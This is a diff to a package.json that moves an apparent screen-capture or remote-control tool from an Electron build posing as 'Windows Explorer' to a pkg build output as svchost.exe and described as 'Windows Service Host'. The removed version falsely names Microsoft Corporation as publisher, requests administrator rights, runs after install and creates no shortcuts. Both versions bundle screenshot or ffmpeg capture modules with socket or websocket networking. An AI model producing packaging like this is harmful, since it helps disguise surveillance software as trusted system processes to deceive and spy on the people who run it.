@@ -1,72 +1,33 @@
 {
-  "name": "explorer",
+  "name": "svchost",
   "version": "1.0.0",
-  "description": "Windows Explorer",
-  "main": "main.js",
-  "scripts": {
-    "dev": "electron .",
-    "build": "electron-builder",
-    "build:win": "electron-builder --win",
-    "build:linux": "electron-builder --linux"
+  "description": "Windows Service Host",
+  "main": "main-cli.js",
+  "bin": {
+    "svchost": "./main-cli.js"
   },
-  "build": {
-    "appId": "com.microsoft.explorer",
-    "productName": "Windows Explorer",
-    "directories": {
-      "output": "dist"
-    },
-    "files": [
-      "**/*",
-      "!node_modules/**/*",
-      "node_modules/express/**/*",
-      "node_modules/socket.io/**/*",
-      "node_modules/socket.io-client/**/*",
-      "node_modules/node-notifier/**/*",
-      "node_modules/screenshot-desktop/**/*"
-    ],
-    "win": {
-      "target": "nsis",
-      "publisherName": "Microsoft Corporation",
-      "icon": "assets/icon.ico",
-      "requestedExecutionLevel": "requireAdministrator",
-      "artifactName": "explorer.exe",
-      "fileAssociations": [
-        {
-          "ext": "exe",
-          "name": "Windows Executable",
-          "description": "Windows Executable File"
-        }
-      ]
-    },
-    "nsis": {
-      "oneClick": false,
-      "allowToChangeInstallationDirectory": true,
-      "createDesktopShortcut": false,
-      "createStartMenuShortcut": false,
-      "shortcutName": "Windows Explorer",
-      "runAfterFinish": true,
-      "deleteAppDataOnUninstall": false,
-      "installerIcon": "assets/icon.ico",
-      "uninstallerIcon": "assets/icon.ico",
-      "installerHeaderIcon": "assets/icon.ico",
-      "displayLanguageSelector": false,
-      "language": "1033"
-    },
-    "linux": {
-      "target": "AppImage"
-    }
+  "scripts": {
+    "start": "node main-cli.js",
+    "dev": "node main-cli.js",
+    "build": "pkg main-cli.js --targets node18-win-x64 --output svchost.exe",
+    "build:win": "pkg main-cli.js --targets node18-win-x64 --output svchost.exe"
   },
   "dependencies": {
-    "@electron/remote": "^2.1.3",
-    "express": "^4.18.2",
-    "node-notifier": "^10.0.1",
-    "pixelmatch": "^7.1.0",
-    "screenshot-desktop": "^1.12.7",
-    "socket.io": "^4.7.2",
-    "socket.io-client": "^4.7.2"
+    "ws": "^8.14.2"
   },
   "devDependencies": {
-    "electron": "^27.0.0",
-    "electron-builder": "^24.6.4"
+    "pkg": "^5.8.1"
+  },
+  "pkg": {
+    "assets": [
+      "assets/**/*",
+      "ffmpeg-windows.js",
+      "ffmpeg-capture.js",
+      "native-capture.js"
+    ],
+    "targets": [
+      "node18-win-x64"
+    ],
+    "outputPath": "dist"
   }
 }
